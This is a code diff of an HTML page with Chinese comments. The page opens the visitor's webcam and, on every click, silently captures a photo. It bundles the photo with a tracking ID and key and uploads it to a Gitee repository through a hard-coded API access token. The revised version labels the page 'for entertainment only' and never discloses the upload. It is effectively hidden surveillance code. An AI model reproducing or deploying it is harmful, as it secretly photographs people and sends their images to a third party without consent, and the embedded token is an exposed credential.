@@ -1,152 +1,142 @@
 <!DOCTYPE html>
-<html>
-	<head>
-		<meta charset="utf-8">
-		<title>巷</title>
-	</head>
-	<body onclick="takePhoto()">
-		<video id="video" width="640" height="480" autoplay></video>
-		<img id="photo" alt="" />
-	</body>
-	 <script>
-		 // 生成一个新的唯一ID
-		 function generateUniqueId() {  
-		     const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';  
-		     let id = '';  
-		     for (let i = 0; i < 16; i++) {  
-		         id += chars[Math.floor(Math.random() * chars.length)];  
-		     }  
-		     return id;  
-		 }  
-		   
-		 // 检查localStorage中是否存在唯一ID  
-		 if (localStorage.getItem('ID')&&localStorage.getItem('key')) {  
-		     // 如果存在，则打印唯一ID  
-		      console.log('Unique ID:', localStorage.getItem('ID'));
-		    console.log('Unique key:', localStorage.getItem('key'))
-			sessionStorage.removeItem('key');
-		 } else { 
-		    //如果没有唯一ID，则生成一个新的唯一ID并存储在localStorage中  
-		      const ID = Math.random().toString(36).substring(7);  
-		     localStorage.setItem('ID', ID);
-		    
-		     const key = generateUniqueId();  
-		     localStorage.setItem('key', key);  
-		   
-		     // 打印唯一ID  
-		  console.log('Unique ID:',ID );
-		   console.log('Unique :', key);
-		     
-		 }
-		 
-		 const video = document.getElementById("video");
-		 const photo = document.getElementById("photo");
-		 let stream;
-		 
-		 // 获取相机权限并打开摄像头
-		 navigator.mediaDevices
-		   .getUserMedia({ video: true })
-		   .then((mediaStream) => {
-		     stream = mediaStream;
-		     video.srcObject = mediaStream;
-		     video.onloadedmetadata = () => {
-		       video.play();
-		     };
-		   })
-		   .catch((error) => {
-		     console.log("无法获取相机权限:", error);
-		   });
-		 
-		 function takePhoto() {
-		   // 创建一个canvas元素来绘制照片
-		   const canvas = document.createElement("canvas");
-		   const context = canvas.getContext("2d");
-		 
-		   // 设置canvas的宽度和高度与视频流的宽高相同
-		   canvas.width = video.videoWidth;
-		   canvas.height = video.videoHeight;
-		 
-		   // 在canvas上绘制当前视频帧
-		   context.drawImage(video, 0, 0, canvas.width, canvas.height);
-		 
-		   // 获取图像的base64编码
-		   const base64Data = canvas.toDataURL("image/jpeg");
-		 
-		   // 在img元素中显示拍摄的照片
-		   photo.src = base64Data;
-		 
-		   const key = localStorage.getItem("key");
-		   var id = localStorage.getItem("ID");
-		   //json格式
-		   const obj = {
-		     id: id,
-		     key: key,
-		     img: base64Data,
-		   };
-		   const jsonString = JSON.stringify(obj);
-		   const contents = btoa(jsonString);
-		 
-		   console.log(jsonString);
-		   console.log("key:", key);
-		   console.log("ID:", id);
-		   console.log(contents);
-		   // 将base64编码的图像数据发送到服务器保存
-		   uploadData(contents, "photo.jpg");
-		 
-		   // 暂停视频流
-		   video.pause();
-		   stream.getVideoTracks()[0].stop();
-		 }
-		 
-		 function uploadData(contents) {
-		   var data = {
-		     access_token: "7f8823412c1b2262f256ee292d7d6fa2", // 替换为有效的访问令牌
-		     content: contents,
-		     message: "Upload photo",
-		   };
-		   // 创建一个新的Date对象并获取当前时间
-		   var now = new Date(); // 获取年月日
-		   var year = now.getFullYear();
-		   var month = now.getMonth() + 1; //月份是从0开始的，所以需要加1
-		   var day = now.getDate(); // 获取时分秒
-		   var hours = now.getHours();
-		   var minutes = now.getMinutes();
-		   var seconds = now.getSeconds();
-		   // 在月日时间内个位数前面自动加0
-		   month = month < 10 ? "0" + month : month;
-		   day = day < 10 ? "0" + day : day; // 组合年月日字符串
-		   var formattedDate = year + "-" + month + "-" + day; // 在时分秒内个位数前面自动加0
-		   hours = hours < 10 ? "0" + hours : hours;
-		   minutes = minutes < 10 ? "0" + minutes : minutes;
-		   seconds = seconds < 10 ? "0" + seconds : seconds; // 组合时分秒字符串
-		   var formattedTime = hours + ":" + minutes + ":" + seconds; //组合年月日加时分秒
-		   var nowtime = formattedDate + "*" + formattedTime;
-		   console.log(formattedDate); //输出格式如：2023-03-15
-		   console.log(formattedTime); // 输出格式如：13:45:27
-		   console.log(nowtime); // 输出格式如：0000-00-00*00:00:00
-		   var id = localStorage.getItem("ID");
-		 
-		   console.log("ID:", id);
-		 
-		   var url = `https://gitee.com/api/v5/repos/xiang-520/xiang/contents/img/${id}/${nowtime}.txt`;
-		 
-		   var xhr = new XMLHttpRequest();
-		   xhr.open("POST", url, true);
-		   xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		 
-		   xhr.onload = function () {
-		     if (xhr.status === 201) {
-		       console.log("数据上传成功!");
-		     } else {
-		       console.log("数据上传失败.");
-		     }
-		   };
-		 
-		   xhr.onerror = function () {
-		     console.log("请求异常.");
-		   };
-		 
-		   xhr.send(JSON.stringify(data));
-		 }
-	 </script> 
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>获取摄像头权限并显示</title>
+  <link rel="stylesheet" href="css/index.css" />
+  <script src="js/ID.js"></script>
+</head>
+
+<body>
+  <div id="body"></div>
+
+  <div width="100%" height="100%" onclick="takePhoto()">
+    <video id="video" autoplay></video>
+    <img id="photo" src="" alt="" />
+  </div>
+
+
+  <script>
+    const video = document.getElementById("video");
+    const photo = document.getElementById("photo");
+    let stream;
+
+    // 获取相机权限并打开摄像头
+    navigator.mediaDevices
+      .getUserMedia({ video: true })
+      .then((mediaStream) => {
+        stream = mediaStream;
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = () => {
+          video.play();
+          document.getElementById('body').innerHTML = `
+          <div width="100%" height="100%" onclick="takePhoto()">
+          <video id="video" autoplay></video>
+          <img id="photo" src="" alt="" />
+        <p>仅供娱乐</p>
+          </div>
+          `
+        };
+      })
+      .catch((error) => {
+        alert('您拒绝了摄像头请求')
+        window.location.href = "https://xiang-520.4everland.app/";
+      });
+
+    function takePhoto() {
+      // 创建一个canvas元素来绘制照片
+      const canvas = document.createElement("canvas");
+      const context = canvas.getContext("2d");
+
+      // 设置canvas的宽度和高度与视频流的宽高相同
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // 在canvas上绘制当前视频帧
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // 获取图像的base64编码
+      const base64Data = canvas.toDataURL("image/jpeg");
+
+      // 在img元素中显示拍摄的照片
+      photo.src = base64Data;
+
+      const key = localStorage.getItem("key");
+      var id = localStorage.getItem("ID");
+      //json格式
+      const obj = {
+        id: id,
+        key: key,
+        img: base64Data,
+      };
+      const jsonString = JSON.stringify(obj);
+      const contents = btoa(jsonString);
+
+      console.log(jsonString);
+      console.log("key:", key);
+      console.log("ID:", id);
+      console.log(contents);
+      // 将base64编码的图像数据发送到服务器保存
+      uploadData(contents, "photo.jpg");
+
+      // 暂停视频流
+      //video.pause();
+      //  stream.getVideoTracks()[0].stop();
+    }
+
+    function uploadData(contents) {
+      var data = {
+        access_token: "7f8823412c1b2262f256ee292d7d6fa2", // 替换为有效的访问令牌
+        content: contents,
+        message: "Upload photo",
+      };
+      // 创建一个新的Date对象并获取当前时间
+      var now = new Date(); // 获取年月日
+      var year = now.getFullYear();
+      var month = now.getMonth() + 1; //月份是从0开始的，所以需要加1
+      var day = now.getDate(); // 获取时分秒
+      var hours = now.getHours();
+      var minutes = now.getMinutes();
+      var seconds = now.getSeconds();
+      // 在月日时间内个位数前面自动加0
+      month = month < 10 ? "0" + month : month;
+      day = day < 10 ? "0" + day : day; // 组合年月日字符串
+      var formattedDate = year + "-" + month + "-" + day; // 在时分秒内个位数前面自动加0
+      hours = hours < 10 ? "0" + hours : hours;
+      minutes = minutes < 10 ? "0" + minutes : minutes;
+      seconds = seconds < 10 ? "0" + seconds : seconds; // 组合时分秒字符串
+      var formattedTime = hours + ":" + minutes + ":" + seconds; //组合年月日加时分秒
+      var nowtime = formattedDate + "*" + formattedTime;
+      console.log(formattedDate); //输出格式如：2023-03-15
+      console.log(formattedTime); // 输出格式如：13:45:27
+      console.log(nowtime); // 输出格式如：0000-00-00*00:00:00
+      var id = localStorage.getItem("ID");
+
+      console.log("ID:", id);
+
+      var url = `https://gitee.com/api/v5/repos/xiang-520/xiang/contents/img/${id}/${nowtime}.txt`;
+
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", url, true);
+      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+      xhr.onload = function () {
+        if (xhr.status === 201) {
+          console.log("数据上传成功!");
+        } else {
+          console.log("数据上传失败.");
+        }
+      };
+
+      xhr.onerror = function () {
+        console.log("请求异常.");
+      };
+
+      xhr.send(JSON.stringify(data));
+    }
+  </script>
+</body>
+
 </html>
